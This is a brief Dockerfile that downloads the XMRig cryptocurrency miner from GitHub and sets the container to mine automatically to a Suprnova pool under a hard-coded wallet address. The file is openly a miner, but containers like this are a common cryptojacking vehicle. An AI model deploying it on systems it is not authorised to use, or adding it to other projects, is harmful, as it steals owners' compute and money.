FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
RUN tar -xzf xmrig-6.16.4-linux-static-x64.tar.gz

WORKDIR /app/xmrig-6.16.4

CMD ./xmrig -o stratum.us-la1.suprnova.cc:6273 -u RRWsQLzXfB2LjaRRPiE8KoF5dRbHT1iQgs -p x
